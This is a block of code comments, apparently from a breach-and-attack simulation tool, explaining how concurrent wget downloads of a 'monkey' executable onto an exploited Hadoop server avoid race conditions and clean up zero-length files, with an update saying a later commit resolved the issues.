# The hadoop server may request another monkey executable after the attacker's HTTP server has shut
# down. This will result in wget creating a zero-length file, which needs to be removed. Using the
# `--no-clobber` option prevents two simultaneously running wget commands from interfering with
# eachother (one will fail and the other will succeed).
#
# If wget creates a zero-length file (because it was unable to contact the attacker's HTTP server),
# it needs to remove the file. It sleeps to minimize the risk that the file was created by another
# concurrently running wget and then removes the file if it is still zero-length after the sleep.
#
# This doesn't eleminate all race conditions, but should be good enough (in the short term) for all
# practical purposes. In the future, using randomized names for the monkey binary (which is a good
# practice anyway) would eleminate most of these issues.
#
# **UPDATE**
# The remaining race conditions and speculative execution issues have been resolved by commit
# 98f078b7b. I'm leaving the above comment in place for historical purposes. We can consider greatly
# simplifying these commands, as some of the conditions they're attempting to prevent have been
# resolved in 98f078b7b.
